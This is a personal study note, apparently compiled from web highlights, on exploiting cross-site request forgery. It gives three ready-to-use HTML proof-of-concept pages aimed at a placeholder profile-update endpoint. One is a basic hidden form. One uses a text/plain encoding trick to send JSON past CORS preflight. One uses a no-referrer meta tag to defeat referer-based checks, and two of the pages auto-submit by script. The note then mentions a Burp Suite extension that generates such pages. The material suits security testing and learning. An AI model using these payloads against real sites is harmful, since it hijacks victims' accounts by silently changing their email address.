summary: CSRF (Cross-Site Request Forgery) vulnerabilities occur when attackers trick a victim's browser into performing unauthorized actions on their behalf. The article explains how to identify and exploit these vulnerabilities, covering both basic and advanced methods. It emphasizes the importance of browser security measures and provides examples of exploitation techniques, encouraging readers to practice their skills.

# CSRF: A Complete Guide to Exploiting Advanced CSRF Vulnerabilities

## Basic CSRF PoC

[Cross-Site Request Forgery (CSRF)](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/Cross-Site%20Request%20Forgery%20(CSRF).md) in the most basic form can be exploited by crafting the following proof of concept: [](https://read.readwise.io/read/01j6kq8rdaxpdmjz0mm59v60s8)
```html
<!DOCTYPE html>
<html>
<body>
<h1>CSRF Proof of Concept</h1>
<form method="POST" action="https://app.example.com/api/profile/update">
<input type="hidden" name="new_email" value="user@example.com">
<input type="submit" value="Submit Request">
</form>
</body>
</html> 
```

## Bypass CORS sending text/plain content-type

Some content types, like JSON, trigger another browser security measure ([Cross-origin resource sharing (CORS)](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/Cross-origin%20resource%20sharing%20(CORS).md)) and will make our CSRF attempt futile.

To bypass this case, we can check if the API server is **capable of handling other content types** such as form data. Oftentimes, this is the case as the underlying code or external package is still configured and capable of parsing other content types. [](https://read.readwise.io/read/01j6kqad1d78gaggf86pe5sbpp)

You may also come across an API that only accepts data as JSON. Even in that case, it is possible to send data in JSON without triggering CORS by enforcing the `text/plain` content type! [](https://read.readwise.io/read/01j6kqc88avcrjwh5sfn8vays0)

```html
<!DOCTYPE html> <html> <body> <form action="https://app.example.com/api/profile/update" method="POST" enctype="text/plain"> <input type="hidden" name='{"test":"x' value='y","new_email":"attacker@example.com"}'/> <input type="submit" value="Submit request"/> </form> <script>history.pushState('','','/');document.forms[0].submit();</script> </body> </html> 
```

## Bypass CSRF protection sending Requests without Referer

Another case you should test for is when no referer header is sent with the request and when there is no fallback set. Developers think that it is not possible to send a request through a browser without a referer header. We can however craft a proof of concept that'd do just that, send a request without a referer header and bypass this anti-CSRF case: [](https://read.readwise.io/read/01j6kqkwmphqgvvyx7cb27c5r0)
```html
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<!-- Prevent referer header from being sent -->
<meta name="referrer" content="no-referrer">
</head>
<body>
<form action="https://app.example.com/api/profile/update" method="POST">
<input type="hidden" name="new_email" value="attacker@example.com"/>
<input type="submit" value="Submit request"/>
</form>
<script>history.pushState('','','/');document.forms[0].submit();</script>
</body>
</html>
```

## CSRF PoC Creator

CSRF PoC Creator is a [Burpsuite](../../Dev,%20ICT%20&%20Cybersec/Tools/Burpsuite.md) extension that can help you generate proof of concepts from raw HTTP requests in Burpsuite. It is available for both the Community as well as the Professional edition of Burpsuite.
